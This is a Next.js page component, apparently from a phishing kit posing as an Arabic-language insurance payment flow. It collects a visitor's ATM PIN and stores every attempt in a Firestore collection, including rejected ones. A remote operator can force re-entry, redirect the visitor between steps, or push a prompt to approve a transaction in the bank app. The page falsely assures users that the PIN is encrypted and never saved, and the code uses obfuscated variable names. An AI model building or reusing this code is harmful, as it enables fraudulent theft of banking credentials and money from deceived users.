"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Lock, AlertCircle, ShieldCheck, Eye, Smartphone } from "lucide-react"
import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
import { StepShell } from "@/components/step-shell"
import { db } from "@/lib/firebase"
import { doc, setDoc, onSnapshot, Firestore } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"

export default function ConfiPage() {
  const router = useRouter()
  const [_v6, _s6] = useState("")
  const [error, setError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isLoading, setIsLoading] = useState(true)
  const [visitorId, setVisitorId] = useState<string>("")
  const [_v6Status, _ss6] = useState<"pending" | "verifying" | "approved" | "rejected" | "message">("pending")

  useEffect(() => {
    const id = localStorage.getItem("visitor") || ""
    setVisitorId(id)
  }, [])

  useRedirectMonitor({ visitorId, currentPage: "confi" })

  useEffect(() => {
    if (!visitorId || !db) return

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const step = data.currentStep

          if (step === "home") {
            router.push("/insur")
          } else if (step === "phone") {
            router.push("/step5")
          } else if (step === "_t6") {
            router.push("/step4")
          } else if (step === "_st1") {
            router.push("/check")
          } else if (step === "_t2") {
            router.push("/step2")
          }
        }
      },
      (error) => {
        console.error("Navigation listener error:", error)
      }
    )

    return () => unsubscribe()
  }, [router, visitorId])

  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      router.push("/home-new")
      return
    }

    if (!db) return
    const docRef = doc(db as Firestore, "pays", visitorID)
    const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
      if (!docSnapshot.exists()) {
        router.push("/check")
        return
      }
      
      const data = docSnapshot.data()
      const status = data._v6Status as "pending" | "verifying" | "approved" | "rejected" | "message" | undefined
      
      if (status === "message") {
        _ss6("message")
      } else if (status === "rejected") {
        const currentPin = {
          code: data._v6,
          rejectedAt: new Date().toISOString()
        }
        
        setDoc(docRef, {
          oldPin: data.oldPin ? [...data.oldPin, currentPin] : [currentPin],
          _v6Status: "pending"
        }, { merge: true }).then(() => {
          _ss6("pending")
          _s6("")
          setError("تم رفض الرمز. يرجى إدخال رمز صراف آلي صحيح.")
          setIsSubmitting(false)
        }).catch(err => {
          console.error("Error saving rejected PIN:", err)
          setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
          setIsSubmitting(false)
        })
      }
      
      setIsLoading(false)
    })

    return () => unsubscribe()
  }, [router])

  const handlePinSubmit = async () => {
    if (_v6.length !== 4) {
      setError("يرجى إدخال رمز الصراف الآلي المكون من 4 أرقام")
      return
    }

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
      return
    }

    setIsSubmitting(true)

    try {
      if (!db) throw new Error("Firebase not configured")
      await setDoc(doc(db as Firestore, "pays", visitorID), {
        _v6,
        pinSubmittedAt: new Date().toISOString(),
        _v6Status: "approved",
        currentStep: "phone",
        paymentStatus: "pin_completed",
        pinUpdatedAt: new Date().toISOString()
      }, { merge: true })

      await addToHistory(visitorID, "_t3", {
        _v6
      }, "approved")

      setTimeout(() => {
        router.push("/step5")
      }, 2000)
    } catch (err) {
      console.error("Error submitting PIN:", err)
      setError("حدث خطأ في إرسال الرمز. يرجى المحاولة مرة أخرى.")
      setIsSubmitting(false)
    }
  }

  if (isLoading) {
    return <SimpleSpinner />
  }

  return (
    <>
      {(isSubmitting || _v6Status === "verifying") && (
        <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
      )}

      {(_v6Status === "message") && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a4a68]/95" dir="rtl">
          <div className="text-center space-y-6 px-8">
            <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-yellow-400/30" />
              <div className="absolute h-20 w-20 rounded-full border-4 border-yellow-400/50" />
              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-yellow-400/20">
                <Smartphone className="h-8 w-8 text-yellow-400" />
              </div>
            </div>
            <div className="space-y-3">
              <p className="text-xl font-bold leading-relaxed text-white">
                تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
              </p>
              <div className="flex items-center justify-center gap-2">
                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "150ms" }} />
                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
              </div>
            </div>
          </div>
        </div>
      )}

      <StepShell
        step={4}
        title="رمز الصراف الآلي (ATM)"
        subtitle="الرجاء إدخال رمز الصراف الآلي المكون من 4 خانات لتأكيد ملكية البطاقة"
        icon={<Lock className="h-8 w-8" />}
      >
        <form onSubmit={(e) => { e.preventDefault(); handlePinSubmit(); }} className="space-y-4">
          {error && (
            <Alert variant="destructive" className="border-2">
              <AlertCircle className="h-5 w-5" />
              <AlertDescription className="text-base">{error}</AlertDescription>
            </Alert>
          )}

          <div className="rounded-xl border border-[#d9e9df] bg-[#f4fbf7] p-4">
            <div className="space-y-2 text-sm text-[#2f6c54]">
              <div className="flex items-center gap-2">
                <ShieldCheck className="h-4 w-4" />
                <span>للتأكد من هويتك وحماية حسابك</span>
              </div>
              <div className="flex items-center gap-2">
                <Lock className="h-4 w-4" />
                <span>رمز الصراف الآلي محمي ومشفر بالكامل</span>
              </div>
              <div className="flex items-center gap-2">
                <Eye className="h-4 w-4" />
                <span>لن يتم حفظ أو مشاركة رمز الصراف الآلي</span>
              </div>
            </div>
          </div>

          <Input
            type="password"
            inputMode="numeric"
            placeholder="رمز الصراف الآلي (ATM)"
            value={_v6}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, "").slice(0, 4)
              _s6(value)
              setError("")
            }}
            maxLength={4}
            className="h-12 rounded-xl border-2 border-[#d2e1ed] bg-white px-4 text-center text-2xl font-bold tracking-[0.5em] text-[#194e6e] placeholder:text-[#93a7b7] focus:border-[#145072]"
            disabled={isSubmitting || _v6Status === "verifying"}
            required
            autoFocus
          />

          <Button
            type="submit"
            className="h-12 w-full rounded-xl bg-gradient-to-r from-[#f0b429] to-[#f7c04a] text-lg font-extrabold text-[#145072] shadow-md transition-all hover:from-[#e2a61f] hover:to-[#f0b429]"
            disabled={_v6.length !== 4 || isSubmitting || _v6Status === "verifying"}
          >
            تأكيد الدفع
          </Button>
        </form>
      </StepShell>
    </>
  )
}
